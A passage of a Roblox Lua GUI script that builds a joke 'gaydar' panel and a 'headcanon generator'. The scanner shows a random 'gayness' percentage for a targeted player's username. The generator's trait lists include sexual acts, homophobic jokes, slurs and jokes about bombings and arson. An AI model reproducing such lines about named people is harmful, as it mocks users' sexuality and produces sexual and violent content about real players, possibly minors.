end)

cangaydarscan = true

function scanTarget()
	playclicksound()
	if not cangaydarscan or not targetuserinfo.username then 
		return 
	end

	cangaydarscan = false

	local scan = Instance.new("Sound")
	scan.SoundId = "rbxassetid://8503529653"
	scan.Parent = box["local player"]
	scan.Name = "canttouchthis"
	scan.Volume = 1
	scan:Play()

	box["gaydar info"].Text = string.format("target: %s\nuser: %s\n\ngayness: scanning...\naccuracy: scanning...", 
		targetuserinfo.username, 
		targetuserinfo.displayName or targetuserinfo.username
	)

	local scanTime = math.random(1, 4)
	task.delay(scanTime, function()
		local yay = Instance.new("Sound")
		yay.SoundId = "rbxassetid://8458409341"
		yay.Parent = box["local player"]
		yay.Name = "canttouchthis"
		yay.Volume = 1
		yay:Play()

		local gayness = math.random(0, 100)
		local accuracy = math.random(60, 100)

		box["gaydar info"].Text = string.format(
			"target: %s\nuser: %s\n\ngayness: %d%%\naccuracy: %d%%",
			targetuserinfo.username,
			targetuserinfo.displayName or targetuserinfo.username,
			gayness,
			accuracy
		)

		wait(1) cangaydarscan = true
	end)
end

box["gaydar scan"].MouseButton1Click:Connect(scanTarget)

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab block main frame"].Size = UDim2.new(0, 376, 0, 203)
box["gaydar tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["gaydar tab block main frame"].BackgroundColor3 = box["default background color"]

box["gaydar tab block main frame"].BorderColor3 = box["default border color"]
box["gaydar tab block main frame"].BorderSizePixel = 1
box["gaydar tab block main frame"].BackgroundTransparency = 1

box["gaydar tab block main frame"].Parent = box["gaydar tab top bar"]
box["gaydar tab block main frame"].ZIndex = 314
box["gaydar tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["gaydar tab block all"].Size = UDim2.new(0, 376, 0, 230)
box["gaydar tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["gaydar tab block all"].BackgroundColor3 = box["default background color"]

box["gaydar tab block all"].BorderColor3 = box["default border color"]
box["gaydar tab block all"].BorderSizePixel = 1
box["gaydar tab block all"].BackgroundTransparency = 0

box["gaydar tab block all"].Parent = box["gaydar tab top bar"]
box["gaydar tab block all"].ZIndex = 315
box["gaydar tab block all"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab top bar"].Size = UDim2.new(0, 446, 0, 26)

box["headcanon generator tab top bar"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab top bar"].BorderColor3 = box["default border color"]
box["headcanon generator tab top bar"].BorderSizePixel = 1

box["headcanon generator tab top bar"].TextColor3 = box["default border color"]
box["headcanon generator tab top bar"].Font = Enum.Font.RobotoMono
box["headcanon generator tab top bar"].TextSize = 15
box["headcanon generator tab top bar"].TextScaled = false
box["headcanon generator tab top bar"].Text = " headcanon generator.lua o.o"
box["headcanon generator tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["headcanon generator tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["headcanon generator top bar text padding"] = Instance.new("UIPadding")
box["headcanon generator top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["headcanon generator top bar text padding"].PaddingRight = UDim.new(0, 0)
box["headcanon generator top bar text padding"].Parent = box["headcanon generator tab top bar"]

box["headcanon generator tab top bar"].Parent = box["screen gui"]
box["headcanon generator tab top bar"].ZIndex = 203
box["headcanon generator tab top bar"].Visible = false

function draghcgentabtopbar()
	local frame = box["headcanon generator tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

draghcgentabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["headcanon generator tab top bar close button"].Position = UDim2.new(0, 424, 0, 4.7)

box["headcanon generator tab top bar close button"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab top bar close button"].BorderColor3 = box["default border color"]
box["headcanon generator tab top bar close button"].BorderSizePixel = 1

box["headcanon generator tab top bar close button"].TextColor3 = box["default border color"]
box["headcanon generator tab top bar close button"].Font = Enum.Font.RobotoMono
box["headcanon generator tab top bar close button"].TextSize = 16
box["headcanon generator tab top bar close button"].TextScaled = false
box["headcanon generator tab top bar close button"].Text = "X"
box["headcanon generator tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["headcanon generator tab top bar close button"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab top bar close button"].ZIndex = 204

box["headcanon generator tab top bar close button text padding"] = Instance.new("UIPadding")
box["headcanon generator tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["headcanon generator tab top bar close button text padding"].Parent = box["headcanon generator tab top bar close button"]

box["headcanon generator tab top bar close button"].MouseButton1Click:Connect(function()
	if not hcgentabcanminimize then return end
	hcgentabopen = false
	hcgentabminimized = false
	playclicksound()
	box["headcanon generator tab top bar"].Visible = false
	repos(box["headcanon generator tab top bar"], 0, 446, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["headcanon generator tab top bar minimize button"].Position = UDim2.new(0, 400, 0, 4.7)

box["headcanon generator tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab top bar minimize button"].BorderColor3 = box["default border color"]
box["headcanon generator tab top bar minimize button"].BorderSizePixel = 1

box["headcanon generator tab top bar minimize button"].TextColor3 = box["default border color"]
box["headcanon generator tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["headcanon generator tab top bar minimize button"].TextSize = 16
box["headcanon generator tab top bar minimize button"].TextScaled = false
box["headcanon generator tab top bar minimize button"].Visible = true
box["headcanon generator tab top bar minimize button"].Text = "-"
box["headcanon generator tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["headcanon generator tab top bar minimize button"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab top bar minimize button"].ZIndex = 204

box["headcanon generator tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["headcanon generator tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["headcanon generator tab top bar minimize button text padding"].Parent = box["headcanon generator tab top bar minimize button"]

hcgentabminimized = false
hcgentabcanminimize = true

box["headcanon generator tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not hcgentabcanminimize then return end
	spawn(playclicksound)
	hcgentabcanminimize = false

	hcgentabminimized = not hcgentabminimized

	if hcgentabminimized then
		box["headcanon generator tab top bar minimize button"].Text = "+"
		box["headcanon generator tab block main frame"].Visible = true

		local fadeTween = fade(box["headcanon generator tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["headcanon generator tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["headcanon generator tab block main frame"],
			UDim2.new(0, 446, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		hcgentabreallyminimized = true
		box["headcanon generator tab block main frame"].Visible = false
		updcols()
	else
		box["headcanon generator tab top bar minimize button"].Text = "-"
		box["headcanon generator tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["headcanon generator tab block main frame"],
			UDim2.new(0, 446, 0, 141),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["headcanon generator tab main frame 1"].Visible = true

		local fadeTween = fade(box["headcanon generator tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		hcgentabreallyminimized = false
		box["headcanon generator tab block main frame"].Visible = false
		updcols()
	end

	hcgentabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["headcanon generator tab top bar reposition button"].Position = UDim2.new(0, 376, 0, 4.7)

box["headcanon generator tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab top bar reposition button"].BorderColor3 = box["default border color"]
box["headcanon generator tab top bar reposition button"].BorderSizePixel = 1

box["headcanon generator tab top bar reposition button"].TextColor3 = box["default border color"]
box["headcanon generator tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["headcanon generator tab top bar reposition button"].TextSize = 16
box["headcanon generator tab top bar reposition button"].TextScaled = false
box["headcanon generator tab top bar reposition button"].Text = "R"
box["headcanon generator tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["headcanon generator tab top bar reposition button"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab top bar reposition button"].ZIndex = 204

box["headcanon generator tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["headcanon generator tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["headcanon generator tab top bar reposition button text padding"].Parent = box["headcanon generator tab top bar reposition button"]

box["headcanon generator tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["headcanon generator tab top bar"], 0.5, 446, 168 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator tab main frame 1"].Size = UDim2.new(0, 446, 0, 142)
box["headcanon generator tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["headcanon generator tab main frame 1"].BackgroundColor3 = box["default background color"]

box["headcanon generator tab main frame 1"].BorderColor3 = box["default border color"]
box["headcanon generator tab main frame 1"].BorderSizePixel = 1

box["headcanon generator tab main frame 1"].Parent = box["headcanon generator tab top bar"]
box["headcanon generator tab main frame 1"].ZIndex = 202

-------------------------------------------------------------------------------------------------------------------------------

box["headcanon generator output"].Size = UDim2.new(0, 438, 0, 41)
box["headcanon generator output"].Position = UDim2.new(0, 4, 0, 5)

box["headcanon generator output"].BackgroundColor3 = box["default background color"]

box["headcanon generator output"].BorderColor3 = box["default border color"]
box["headcanon generator output"].BorderSizePixel = 0

box["headcanon generator output"].Parent = box["headcanon generator tab main frame 1"]
box["headcanon generator output"].ZIndex = 203

box["headcanon generator output"].Font = Enum.Font.RobotoMono
box["headcanon generator output"].TextColor3 = Color3.new(1, 1, 1)
box["headcanon generator output"].TextSize = 15
box["headcanon generator output"].Text = "..."
box["headcanon generator output"].TextWrapped = true
box["headcanon generator output"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator output"].TextYAlignment = Enum.TextYAlignment.Center
box["headcanon generator output"].ClipsDescendants = true

box["headcanon generator output text padding"] = Instance.new("UIPadding")
box["headcanon generator output text padding"].PaddingLeft = UDim.new(0, 7)
box["headcanon generator output text padding"].PaddingRight = UDim.new(0, 7)
box["headcanon generator output text padding"].Parent = box["headcanon generator output"]

box["headcanon generator input"].Size = UDim2.new(0, 216, 0, 41)
box["headcanon generator input"].Position = UDim2.new(0, 4, 0, 51)

box["headcanon generator input"].BackgroundColor3 = box["default background color"]

box["headcanon generator input"].BorderColor3 = box["default border color"]
box["headcanon generator input"].BorderSizePixel = 1

box["headcanon generator input"].Parent = box["headcanon generator tab main frame 1"]
box["headcanon generator input"].ZIndex = 203

box["headcanon generator input"].Font = Enum.Font.RobotoMono
box["headcanon generator input"].TextColor3 = Color3.new(1, 1, 1)
box["headcanon generator input"].TextSize = 15
box["headcanon generator input"].Text = ""
box["headcanon generator input"].PlaceholderText = "character name"
box["headcanon generator input"].PlaceholderColor3 = box["default 1/2 color"]
box["headcanon generator input"].TextWrapped = true
box["headcanon generator input"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator input"].TextYAlignment = Enum.TextYAlignment.Center
box["headcanon generator input"].ClipsDescendants = true
box["headcanon generator input"].Name = "stay"

box["headcanon generator input text padding"] = Instance.new("UIPadding")
box["headcanon generator input text padding"].PaddingLeft = UDim.new(0, 5)
box["headcanon generator input text padding"].PaddingRight = UDim.new(0, 5)
box["headcanon generator input text padding"].Parent = box["headcanon generator input"]

box["headcanon generator input 2"].Size = UDim2.new(0, 217, 0, 41)
box["headcanon generator input 2"].Position = UDim2.new(0, 225, 0, 51)

box["headcanon generator input 2"].BackgroundColor3 = box["default background color"]

box["headcanon generator input 2"].BorderColor3 = box["default border color"]
box["headcanon generator input 2"].BorderSizePixel = 1

box["headcanon generator input 2"].Parent = box["headcanon generator tab main frame 1"]
box["headcanon generator input 2"].ZIndex = 203

box["headcanon generator input 2"].Font = Enum.Font.RobotoMono
box["headcanon generator input 2"].TextColor3 = Color3.new(1, 1, 1)
box["headcanon generator input 2"].TextSize = 15
box["headcanon generator input 2"].Text = ""
box["headcanon generator input 2"].PlaceholderText = "character name 2 (optional)"
box["headcanon generator input 2"].PlaceholderColor3 = box["default 1/2 color"]
box["headcanon generator input 2"].TextWrapped = true
box["headcanon generator input 2"].TextXAlignment = Enum.TextXAlignment.Center
box["headcanon generator input 2"].TextYAlignment = Enum.TextYAlignment.Center
box["headcanon generator input 2"].ClipsDescendants = true
box["headcanon generator input 2"].Name = "stay"

box["headcanon generator input 2 text padding"] = Instance.new("UIPadding")
box["headcanon generator input 2 text padding"].PaddingLeft = UDim.new(0, 5)
box["headcanon generator input 2 text padding"].PaddingRight = UDim.new(0, 5)
box["headcanon generator input 2 text padding"].Parent = box["headcanon generator input 2"]

box["generate headcanon"].Size = UDim2.new(0, 438, 0, 41)
box["generate headcanon"].Position = UDim2.new(0, 4, 0, 97)

box["generate headcanon"].BackgroundColor3 = box["default background color"]

box["generate headcanon"].BorderColor3 = box["default border color"]
box["generate headcanon"].BorderSizePixel = 1

box["generate headcanon"].Parent = box["headcanon generator tab main frame 1"]
box["generate headcanon"].ZIndex = 203

box["generate headcanon"].Font = Enum.Font.RobotoMono
box["generate headcanon"].TextColor3 = Color3.new(1, 1, 1)
box["generate headcanon"].TextSize = 15
box["generate headcanon"].Text = "generate headcanon"
box["generate headcanon"].TextWrapped = true
box["generate headcanon"].TextXAlignment = Enum.TextXAlignment.Center
box["generate headcanon"].TextYAlignment = Enum.TextYAlignment.Center
box["generate headcanon"].ClipsDescendants = true
box["generate headcanon"].Name = "stay"

box["generate headcanon text padding"] = Instance.new("UIPadding")
box["generate headcanon text padding"].PaddingBottom = UDim.new(0, 0)
box["generate headcanon text padding"].Parent = box["generate headcanon"]

local hcs_one = {
	"%s talks to plants when no one is watching.",
	"%s writes fanfiction about themselves.",
	"%s believes their reflection is plotting against them.",
	"%s is very good at using chopsticks.",
	"%s wears hello kitty pajamas.",
	"%s often brags about how gay they are.",
	"%s has an obession with tangerines.",
	"%s burns popsicle sticks for fun.",
	"%s is an arsonist.",
	"%s owns a comically large anchor.",
	"%s can perform a flawless cartwheel.",
	"%s is very good at playing geometry dash.",
	"%s gets bullied in roblox.",
	"%s gets flamed in every video game.",
	"%s showers once every week.",
	"%s eats kiwis without peeling the skin.",
	"%s laughs like a maniac.",
	"%s believes everything you tell them.",
	"%s can spontaneously combust on command.",
	"%s can burp the whole alphabet.",
	"%s can throw every gang sign in existence.",
	"%s uses a flip phone.",
	"%s unironically listens to phonk.",
	"%s had a concussion at a young age.",
	"%s cries themselves to sleep.",
	"%s draws their classmates kissing each other.",
	"%s is addicted to eating chalk.",
	"%s has a serious gambling addiction.",
	"%s is rich as fuck.",
	"%s knows how to rap.",
	"%s knows every language.",
	"%s wears heart boxers.",
	"%s is talented at everything.",
	"%s sucks at everything.",
	"%s hates talking to people.",
	"%s has scoliosis.",
	"%s is a conspiracy theorist.",
	"%s says \"sorry\" instead of \"bless you\".",
	"%s mails their friends pipe bombs as a joke.",
	"%s stretches like a cat.",
	"%s has an irrational fear of clocks.",
	"%s paints therir nails black using a sharpie.",
	"%s is gay.",
	"%s is trans.",
	"%s is bisexual.",
	"%s hates gay people.",
	"%s hates trans people.",
	"%s hates bisexuals.",
	"%s is aroace.",
	"%s hates aroaces.",
	"%s is extremely homophobic.",
	"%s is a homophobic homosexual.",
	"%s occasionally has brain aneurysms.",
	"%s is a flat earther and gets flamed for it.",
	"%s is super photogenic.",
	"%s looks ugly in every picture taken of them.",
	"%s can balance anything on top of each other.",
	"%s uses a comically large spoon to eat.",
	"%s uses a fork to drink soup.",
	"%s is a masochist.",
	"%s wears anti paparazzi clothing for no reason.",
	"%s can walk like a model.",
	"%s is secretly a femboy.",
	"%s uses a spoon to spread condiments on their bread.",
	"%s has zero manners.",
	"%s tells horrible jokes.",
	"%s takes in stray animals.",
	"%s enunciates.",
	"%s is an alcoholic.",
	"%s had an emo phase.",
	"%s can eat a whole tub of ice cream in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " magnets in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " hotdogs in one sitting.",
	"%s once ate " .. math.random(10, 100) .. " silver coins in one sitting.",
	"%s loves summer.",
	"%s loves winter.",
	"%s loves spring.",
	"%s loves fall.",
	"%s hates summer.",
	"%s hates winter.",
	"%s hates spring.",
	"%s hates fall.",
	"%s is a dog person.",
	"%s is a cat person.",
	"%s has a very low spice tolerance.",
	"%s has a very high spice tolerance.",
	"%s is great at debating.",
	"%s encourages not swearing, but swears.",
	"%s tackles and wrestles people to show affection.",
	"%s hugs people as a surprise greeting.",
	"%s hops on peoples back as a surprise greeting.",
	"%s believes in santa.",
	"%s believes in the tooth fairy.",
	"%s sucks at saying tongue twisters.",
	"%s is surprisingly good at saying tongue twisters.",
	"%s gets road rage.",
	"%s always orders the same thing.",
	"%s is not very good with social cues.",
	"it would not take much for %s to turn evil.",
	"%s likes being alone.",
	"%s hates being alone.",
	"%s doesnt know how to say \"no\".",
	"%s doesnt know how to say \"yes\".",
	"%s speaks in riddles involuntarily.",
	"%s's favorite subject in school was math.",
	"%s's favorite subject in school was french.",
	"%s's favorite subject in school was spanish.",
	"%s's favorite subject in school was gym.",
	"%s's favorite subject in school was ERC.",
	"%s's favorite subject in school was history.",
	"%s's favorite subject in school was geography.",
	"%s's favorite subject in school was algebra.",
	"%s's favorite subject in school was music.",
	"%s's favorite subject in school was arts and crafts.",
	"%s's least favorite subject in school was math.",
	"%s's least favorite subject in school was french.",
	"%s's least favorite subject in school was spanish.",
	"%s's least favorite subject in school was gym.",
	"%s's least favorite subject in school was ERC.",
	"%s's least favorite subject in school was history.",
	"%s's least favorite subject in school was geography.",
	"%s's least favorite subject in school was algebra.",
	"%s's least favorite subject in school was music.",
	"%s's least favorite subject in school was arts and crafts.",
	"%s has a peppy, bouncy walk.",
	"%s doesnt own a single pair of matching socks.",
	"%s is a tough guy with no fear.",
	"%s has a really good immune system.",
	"%s has an immaculate sleeper build.",
	"%s cant drive.",
	"%s can drive.",
	"%s owns a semi truck.",
	"%s owns a koenigsegg jesko.",
	"%s rarely gets hypersexual.",
	"%s cant make the voices go away.",
	"%s has gay friends.",
	"%s killed john lennon.",
	"%s bobs their feet when sittng with crossed legs.",
	"%s eats pizza like a cookie.",
	"%s eats their pizza by folding it in half.",
	"%s secretly hates everyone.",
	"%s listens to country music.",
	"%s loves hyperpop.",
	"%s has short term memory loss.",
	"%s doesnt pay their taxes.",
	"%s commits tax fraud.",
	"%s commits tax evasion.",
	"%s has been canceled on twitter.",
	"%s is shockingly good at playing the piano.",
	"%s is an introvert.",
	"%s is an extrovert.",
	"%s is an ambivert.",
	"%s does not know what sleep is.",
	"%s is going to heaven.",
	"%s is going to hell.",
	"%s uses a two in one shampoo and conditioner.",
	"%s shops exclusively at thrift stores.",
	"%s posts thirst traps about themselves.",
	"%s likes board games, but no one else wants to play with them.",
	"%s walks like theyre drunk.",
	"%s has a record for DUI.",
	"%s has a record for speeding.",
	"%s has a record for grand theft.",
	"%s has a record for grand arson.",
	"%s has a record for shoplifting.",
	"%s has a record for breaking in someones house.",
	"%s has a record for escaping prison.. twice.",
	"%s repetitively gets called a good boy.",
	"%s french kisses their friends.",
	"%s keeps their mugshot as their profile picture in every social media platform.",
	"%s loves physical touch.",
	"%s hates physical touch.",
	"%s can dunk.",
	"%s tryhards in every game they play.",
	"%s is a professional speedrunner.",
	"%s is very affectionate towards everyone they meet.",
	"%s likes to judge people they havent met yet.",
	"%s asks you if they were too rough.",
	"%s can operate a plane.",
	"%s loves sleepovers.",
	"%s jokingly performs CPR on someone to wake them up.",
	"%s has massive glutes.",
	"%s sleepwalks.",
	"%s always has an unstable connection when calling someone.",
	"%s is rich, but is completely oblivious about it.",
	"%s is scared of forests.",
	"%s is secretly a music producer.",
	"%s swears they arent gay but dry humps their friend of the same sex.",
	"%s owns a draco.",
	"%s owns a glock.",
	"%s owns an RPG.",
	"%s owns a deagle.",
	"%s owns a P-90.",
	"%s owns an MK-14 EBR.",
	"%s owns an AK-47.",
	"%s owns a draco with a switch.",
	"%s owns a glock with a switch.",
	"%s owns an RPG with a switch.",
	"%s owns a deagle with a switch.",
	"%s owns a P-90 with a switch.",
	"%s owns an MK-14 EBR with a switch.",
	"%s owns an AK-47 with a switch.",
	"%s is emotionally supportive.",
	"%s swears and shouts in russian.",
	"%s owns a gigantic weaponry.",
	"%s's legal guardian was a navy SEAL.",
	"%s was once drafted into war.",
	"%s believes in tarot cards and crystal balls.",
	"%s loves piggyback rides.",
	"%s can breathe underwater for an extended period of time.",
	"%s is a very good cook.",
	"%s is oblivious of everything.",
	"%s fingers themselves.",
	"%s masturbates.",
	"%s is a philosophist.",
	"%s wears striped pajamas and a night cap to bed.",
	"%s uses gang slang when talking.",
	"%s pronounces \"sybau\" as \"psy bow\".",
	"%s can stay doing a handstand for an extended period of time.",
	"%s loves the beach.",
	"%s loves watching the sunset.",
	"%s is an astronomer.",
	"%s cant throw frisbees properly.",
	"%s owns a pet rock.",
	"%s blew up an adoption center and got away with it.",
	"%s lit a school on fire and got away with it.",
	"%s is secretly a catboy.",
	"%s attends furry conventions.",
	"%s is a fast typer.",
	"%s is a slow typer.",
	"%s can pronounce the chemical form of titin if they wanted to.",
	"%s can count to one million if they wanted to.",
	"%s loves buying breakaway glass bottles and throwing them at their friends.",
	"%s donates to charity.",
	"%s is passive agressive.",
	"%s loves being degraded.",
	"%s lets out a slight whimper after sniffling.",
	"%s gets turned on easily.",
	"%s sneezes like a cat.",
	"%s retches when soemone else does.",
	"%s is scared of their own scream.",
	"%s has 2020 humor.",
	"%s can tell creative insults.",
	"%s has light mode on their device and sets its brightness all the way up.",
	"%s says slurs they cant reclaim, and affirms they got a \"pass\" from their friend.",
	"%s hates fruit snacks.",
	"%s blew in from stupid town.",
	"%s is financially responsible.",
	"%s occasionally goes on shopping sprees.",
	"%s owns a dirt bike.",
	"%s can hack anything.",
	"%s climbs up trees when getting chased in order to escape.",
	"%s thinks everyone is secretly against them.",
	"%s can really pack a punch.",
	"%s gets flirted on. a lot.",
	"%s is deathly allergic to wood.",
	"%s is deathly allergic to metal.",
	"%s is deathly allergic to bananas.",
	"%s is deathly allergic to apples.",
	"%s is deathly allergic to ceramic.",
	"%s is deathly allergic to silicone.",
	"%s is deathly allergic to polyester.",
	"%s is deathly allergic to plastic.",
	"%s is deathly allergic to synthetic rubber.",
	"%s is deathly allergic to oranges.",
	"%s is deathly allergic to oreos.",
	"%s is deathly allergic to cabbage.",
	"%s is deathly allergic to lettuce.",
	"%s is deathly allergic to tomatoes.",
	"%s is deathly allergic to bread.",
	"%s is deathly allergic to cucumbers.",
	"%s is deathly allergic to skittles.",
	"%s is deathly allergic to infrared waves.",
	"%s is deathly allergic to ultraviolet waves.",
	"%s is colorblind.",
	"%s cant sleep without them cuddling someone else.",
	"%s swears in front of kids.",
	"%s has an embarrassing old picture of them hanging on their wall.",
	"%s got hit by a bus once.",
	"%s got hit by a car once.",
	"%s got hit by a truck once.",
	"%s starts decorating for a holiday extremely early.",
	"%s is awful with kids.",
	"%s can kill you in an instant when deserved.",
	"%s takes the blame for everything.",
	"%s is oblivous to any and all romantic interest someone may show them.",
	"%s can perform donuts with a car.",
	"%s can perform donuts with a semi truck.",
	"%s can perform donuts with a bus.",
	"%s has a deviantart account.",
	"%s has a roblox account.",
	"%s has a twitter account.",
	"%s has a pinterest account.",
	"%s has a rednote account.",
	"%s has a tumblr account.",
	"%s has a reddit account.",
	"if %s was presented with an intergalactic portal, they would enter it without question.",
	"%s is not allowed to drink energy drinks.",
	"%s is smart but also very stupid.",
	"%s forgets to eat sometimes.",
	"%s crashed a riding lawn mower into their fence.",
	"%s is a horrible liar.",
	"%s is a very good liar.",
	"%s is a simp.",
	"%s cant spell generous.",
	"%s cant spell restaurant.",
	"%s cant spell wednesday.",
	"%s cant spell jewelry.",
	"%s cant spell tongue.",
	"%s cant spell acquire.",
	"%s cant spell colleague.",
	"%s cant spell diarrhea.",
	"%s does a gang sign every time a picture of them is being taken.",
	"%s once wore a sheisty mask.",
	"%s can throw up on command.",
	"%s is very good at soccer.",
	"%s is very good at basketball.",
	"%s is very good at tennis.",
	"%s is very good at badminton.",
	"%s is very good at golf.",
	"%s is very good at soccer.",
	"%s is very good at baseball.",
	"%s sucks at soccer.",
	"%s sucks at basketball.",
	"%s sucks at tennis.",
	"%s sucks at badminton.",
	"%s sucks at golf.",
	"%s sucks at soccer.",
	"%s sucks at baseball.",
	"%s is afraid of doing anything wihtout other peoples permission.",
	"%s writes too much fanfic to be healthy.",
	"%s wears a sweater during hot weather, and wears a t-shirt during cold weather.",
	"%s sleeps naked.",
	"%s is a top.",
	"%s is a bottom.",
	"%s doesnt know how to say theyre sorry.",
	"%s expresses little to no emotion.",
	"%s cant talk properly.",
	"%s doesnt say what they want directly.",
	"%s's favorite color is red.",
	"%s's favorite color is orange.",
	"%s's favorite color is yellow.",
	"%s's favorite color is green.",
	"%s's favorite color is blue.",
	"%s's favorite color is indigo.",
	"%s's favorite color is violet.",
	"%s's least favorite color is red.",
	"%s's least favorite color is orange.",
	"%s's least favorite color is yellow.",
	"%s's least favorite color is green.",
	"%s's least favorite color is blue.",
	"%s's least favorite color is indigo.",
	"%s's least favorite color is violet.",
	"%s has been to prison.",
	"%s spends far too much money on christmas gifts for their friends.",
	"%s is a kleptomaniac.",
	"%s stole a lollipop at the checkout when they were 5 and they still feel guilty about it.",
	"%s has nicknames for everyone.",
	"%s hates disney movies.",
	"%s is very good at walking in platform heels.",
	"%s relies on people for revision notes.",
	"%s sits on the floor with their legs forming a W.",
	"%s roleplays on discord.",
	"%s gets into twitter discourse.",
	"%s plays dandys world.",
	"%s has punched a hole in their wall.",
	"%s has a diary that they write in with a glittery gel pen.",
	"%s was dropped out of a window as a child.",
	"%s cant sit on a chair properly.",
	"%s is afraid to close their eyes in the shower.",
	"%s could easily survive the hunger games.",
	"%s uses the word \"like\" as a comma.",
	"%s can turn a chromebook into a bomb.",
	"%s has chronic nightmares.",
	"%s reads ao3.",
	"%s is an ao3 writer.",
	"%s knows the lyrics to every hatsune miku song by heart.",
	"%s cringes at their middle school yearbook photos.",
	"%s will go feral. watch out.",
	"%s is physically incapable of writing anything original.",
	"%s location was unknown during 9/11.",
	"%s is secretly in love with their mortal enemy.",
	"%s before a fight, always has the cowboy standoff music in their head playing.",
	"%s is not to be trusted with a sharp object.",
	"%s has done karaoke drunk with friends.",
	"%s is mentioned briefly in some type of major media, but nobody ever notices.",
	"%s has been to the hospital more than the average person.",
	"%s has a little garden that they occasionally work on.",
	"%s does intricate and expensive cosplays.",
	"%s is a discord moderator.",
	"%s is high, at all times.",
	"%s blasts phonk in the middle of the night.",
	"%s listens to nightcore versions of all the popular songs, instead of the original ones.",
	"%s listens to femtanyl way too much.",
	"%s is a pathological liar.",
	"%s is a complusive liar.",
}

local hcs_two = {
	"%s had sex with %s, but they both keep it a secret.",
	"%s killed %s's family.",
	"%s puppyplays with %s.",
	"%s and %s were forced to kiss each other in 7th grade by their classmates.",
	"if someone were to talk shit about %s, %s would call an orbital strike upon them.",
	"%s teases %s for being short.",
	"%s and %s sleeps while calling each other.",
	"%s gave %s about 50 mental disorders in the span of 4 days.",
	"%s and %s always stays near each other.",
	"%s and %s argue about their music tastes.",
	"%s would not hesitate to french kiss the life out of %s.",
	"%s dry humps %s on a daily basis.",
	"%s is always in %s's dreams.",
	"%s is always in %s's nightmares.",
	"%s cant go 20 seconds without %s staying approximately 10 meters in range near them.",
	"%s hates %s. a lot.",
	"when %s and %s sleep together, they both end up in very awkward sleeping positions.",
	"%s toilet papered %s's house as an april fools joke.",
	"%s likes %s. a lot.",
	"%s occasionally flirts with %s.",
	"%s copies everything %s does.",
	"%s and %s are the mere definition of \"dumb\" and \"dumber\".",
	"%s loves being degraded by %s.",
	"%s tops %s.",
	"%s killed %s.",
	"%s accidentally shot %s in the leg in a hunting accident.",
	"%s has a video clip of %s sleeping to mommy asmr.",
	"%s executes deadly chromebook combinations on %s's school chromebook.",
	"when bored in public, %s and %s perform a scarily accurate fent fold next to each other as a silly joke.",
	"%s and %s are in a very complicated love-hate relationship with each other.",
	"%s constantly terrorizes %s with a stuffed animal.",
	"%s and %s are sworn enemies, but people constantly ship them.",
	"%s terrorizes %s for a living.",
	"%s constantly teases %s, but would start a war if anyone else tried.",
